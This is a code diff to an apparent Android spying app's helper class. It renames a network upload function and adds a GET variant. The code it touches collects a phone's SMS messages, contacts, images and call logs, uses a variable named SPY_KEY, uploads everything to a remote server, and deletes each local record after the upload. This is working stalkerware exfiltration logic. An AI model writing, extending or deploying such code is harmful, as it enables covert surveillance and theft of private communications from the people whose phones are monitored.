@@ -93,7 +93,7 @@ public class MyHelper{
                     System.out.println(message_id+"\n"+phonenumber+"\n"+device+"\n"+message_body+"\n"+message_date+"\n");
                     if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                         //send the messages to Mysql online database
-                        String response = MyHelper.connect_to_server(URL, messages);
+                        String response = MyHelper.connect_and_post(URL, messages);
 
                         if (response.equalsIgnoreCase("message saved") || response.equalsIgnoreCase("message exists")) {
                             messageHelper.delete_message(message_id);
@@ -188,7 +188,7 @@ public class MyHelper{
                     System.out.println(contact_id+"\n"+phonenumber+"\n"+device+"\n"+contact_name+"\n"+SPY_KEY+"\n");
                     if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                         //send the messages to Mysql online database
-                        String response = MyHelper.connect_to_server(URL, contacts);
+                        String response = MyHelper.connect_and_post(URL, contacts);
                         System.out.println("--------------------------"+response+"---------------------------");
                         if (response.equalsIgnoreCase("contact saved") || response.equalsIgnoreCase("contact exists")) {
                             contactsHelper.delete_contact(phonenumber);
@@ -224,7 +224,7 @@ public class MyHelper{
             System.out.println(message_id+"\n"+phonenumber+"\n"+device+"\n"+message_body+"\n"+message_date+"\n");
             if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                 //send the messages to Mysql online database
-                String response = MyHelper.connect_to_server(URL, contacts);
+                String response = MyHelper.connect_and_post(URL, contacts);
                 System.out.println("--------------------------sending online contacts------------------------------");
                 if (response.equalsIgnoreCase("contact saved") || response.equalsIgnoreCase("contact exists")) {
                     contactsHelper.delete_contact(phonenumber);
@@ -295,12 +295,36 @@ public class MyHelper{
     }
 
     //connect to the server and write data
-    public static String connect_to_server(String link, String encodedData) throws IOException {
+    public static String connect_and_post(String link, String encodedData) throws IOException {
         URL url = new URL(link);
         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
         connection.setDoOutput(true);
         connection.setDoInput(true);
         connection.setConnectTimeout(15000);
+
+        OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
+        BufferedWriter bufferedWriter = new BufferedWriter(writer);
+        bufferedWriter.write(encodedData);
+        bufferedWriter.flush();
+        bufferedWriter.close();
+
+        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+        StringBuilder sb = new StringBuilder();
+        String line = "";
+        while ((line = reader.readLine()) != null) {
+            sb.append(line);
+        }
+        return sb.toString();
+    }
+    public static String connect_and_get(String link, String encodedData) throws IOException {
+        URL url = new URL(link);
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setDoOutput(true);
+        connection.setDoInput(true);
+        connection.setRequestMethod("GET");
+        connection.setConnectTimeout(15000);
+
+        System.out.println("Url: " + connection.getURL());
 
         OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
         BufferedWriter bufferedWriter = new BufferedWriter(writer);
@@ -487,7 +511,7 @@ public class MyHelper{
 
             if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                 //send the images to Mysql online database
-                String response = MyHelper.connect_to_server(URL, images);
+                String response = MyHelper.connect_and_post(URL, images);
                 System.out.println("-------------------"+response+"-----------------------");
             }
 
@@ -554,7 +578,7 @@ public class MyHelper{
 
             if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                 //send the call logs to Mysql online database
-                String response = MyHelper.connect_to_server(URL, images);
+                String response = MyHelper.connect_and_post(URL, images);
                 System.out.println("-------------------"+response+"-----------------------");
             }
 
